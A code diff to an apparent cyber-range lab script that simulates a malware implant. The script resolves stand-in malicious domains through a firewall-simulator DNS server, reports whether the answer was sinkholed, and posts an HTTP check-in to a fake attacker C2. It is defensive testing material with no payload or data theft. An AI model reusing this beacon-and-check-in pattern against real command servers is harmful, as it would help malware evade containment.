@@ -7,25 +7,34 @@ On a loop it behaves like malware beaconing to its C2:
   2. Inspect the answer:
        - SINKHOLE_IP  -> the firewall sinkholed us; beacon is CONTAINED.
        - attacker IP  -> resolution succeeded; beacon is UNCONTAINED.
-  3. Attempt the C2 callback to the resolved IP (fails in-lab by design; the
-     point is the resolution outcome + the sinkhole/firewall logs).
+  3. HTTP check-in to the resolved IP. Sinkholed -> the callback is blocked by
+     NetworkPolicy. Uncontained -> the name resolves to the fake attacker C2 in
+     the fake-internet namespace, which records the check-in and returns a fake
+     tasking.
+  4. Browse one benign public site (BROWSE_DOMAIN) via the same resolver; it
+     lands on the fake-internet web server.
 
 All behavior is read from the ConfigMap-backed environment.
 """
+import json
 import os
 import time
 import socket
+import urllib.request
 
 from dnslib import DNSRecord, QTYPE, RCODE
 
 DNS_SERVER       = os.getenv("DNS_SERVER", "firewall-sim.cyber-range.svc.cluster.local")
 DNS_PORT         = int(os.getenv("DNS_SERVER_PORT", "8053"))
-MALICIOUS_DOMAIN = os.getenv("MALICIOUS_DOMAIN", "teq.xyz.com").rstrip(".").lower()
+MALICIOUS_DOMAINS = [d.strip().rstrip(".").lower()
+                     for d in os.getenv("MALICIOUS_DOMAIN", "teq.xyz.com").split(",") if d.strip()]
 ALT_DOMAIN       = os.getenv("ALT_DOMAIN", "abc.com").rstrip(".").lower()
 SINKHOLE_IP      = os.getenv("SINKHOLE_IP", "10.255.255.10")
 SINKHOLE_ENABLED = os.getenv("SINKHOLE_ENABLED", "false")
 INTERVAL         = int(os.getenv("BEACON_INTERVAL", "20"))
-CALLBACK_PORT    = int(os.getenv("CALLBACK_PORT", "8080"))
+CALLBACK_PORT    = int(os.getenv("CALLBACK_PORT", "80"))
+BROWSE_DOMAIN    = os.getenv("BROWSE_DOMAIN", "www.example.com").strip().rstrip(".").lower()
+IMPLANT_ID       = socket.gethostname()
 
 
 def log(msg):
@@ -44,49 +53,74 @@ def resolve_via_firewall(domain):
     return (ips[0] if ips else None), "NOERROR"
 
 
-def attempt_callback(ip):
-    """Try a short TCP connect to the resolved C2 IP (expected to fail in-lab)."""
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
+def http_to(ip, host, path, body=None):
+    """HTTP request to `ip` with a Host header, like malware that resolved `host`."""
+    data = json.dumps(body).encode() if body is not None else None
+    req = urllib.request.Request(f"http://{ip}:{CALLBACK_PORT}{path}", data=data,
+                                 headers={"Host": host, "User-Agent": "Mozilla/5.0 (range implant)",
+                                          "Content-Type": "application/json"})
+    with urllib.request.urlopen(req, timeout=3) as r:
+        return r.status, r.read(4096)
+
+
+def checkin(ip, domain):
+    """C2 check-in. Returns (reached, detail)."""
     try:
-        s.connect((ip, CALLBACK_PORT))
-        s.close()
-        return True
+        _, raw = http_to(ip, domain, "/checkin",
+                         {"implant": IMPLANT_ID, "domain": domain, "ts": time.time()})
     except Exception as e:
-        return False
-    finally:
-        try:
-            s.close()
-        except Exception:
-            pass
+        return False, type(e).__name__
+    try:
+        task = json.loads(raw.decode() or "{}")
+        return True, f"task {task.get('task_id', '?')} '{task.get('command', '?')}'"
+    except ValueError:
+        return True, "non-JSON reply"
 
 
-def beacon():
-    ip, rcode = resolve_via_firewall(MALICIOUS_DOMAIN)
+def beacon(domain):
+    ip, rcode = resolve_via_firewall(domain)
     if ip is None:
-        log(f"beacon: {MALICIOUS_DOMAIN} did NOT resolve ({rcode})")
+        log(f"beacon: {domain} did NOT resolve ({rcode})")
         return
 
+    reached, detail = checkin(ip, domain)
     if ip == SINKHOLE_IP:
-        reached = attempt_callback(ip)
-        log(f"[CONTAINED] {MALICIOUS_DOMAIN} -> {ip} (SINKHOLE). "
-            f"C2 callback {'succeeded?!' if reached else 'blocked'} - beacon neutralized.")
+        log(f"[CONTAINED] {domain} -> {ip} (SINKHOLE). "
+            f"C2 check-in {'reached?! ' + detail if reached else 'blocked'} - beacon neutralized.")
     else:
-        reached = attempt_callback(ip)
-        log(f"[UNCONTAINED] {MALICIOUS_DOMAIN} -> {ip} (attacker C2). "
-            f"C2 callback {'reached' if reached else 'attempted (unreachable in-lab)'} "
-            f"- no sinkhole, malware would exfiltrate.")
+        log(f"[UNCONTAINED] {domain} -> {ip} (attacker C2). "
+            f"C2 check-in {'REACHED fake C2, got ' + detail if reached else 'failed (' + detail + ')'} "
+            f"- no sinkhole, implant is talking to its C2.")
+
+
+def browse():
+    if not BROWSE_DOMAIN:
+        return
+    ip, rcode = resolve_via_firewall(BROWSE_DOMAIN)
+    if ip is None:
+        log(f"browse: {BROWSE_DOMAIN} did NOT resolve ({rcode})")
+        return
+    try:
+        status, _ = http_to(ip, BROWSE_DOMAIN, "/")
+        log(f"browse: http://{BROWSE_DOMAIN}/ -> {ip} HTTP {status}")
+    except Exception as e:
+        log(f"browse: http://{BROWSE_DOMAIN}/ -> {ip} failed ({type(e).__name__})")
 
 
 def main():
-    log(f"starting. resolver={DNS_SERVER}:{DNS_PORT} target={MALICIOUS_DOMAIN} "
+    log(f"starting. resolver={DNS_SERVER}:{DNS_PORT} targets={','.join(MALICIOUS_DOMAINS)} "
         f"SINKHOLE_ENABLED={SINKHOLE_ENABLED} interval={INTERVAL}s")
     time.sleep(5)  # let DNS/firewall settle
     while True:
+        for domain in MALICIOUS_DOMAINS:
+            try:
+                beacon(domain)
+            except Exception as e:
+                log(f"beacon error ({domain}): {e}")
         try:
-            beacon()
+            browse()
         except Exception as e:
-            log(f"beacon error: {e}")
+            log(f"browse error: {e}")
         time.sleep(INTERVAL)
 
 
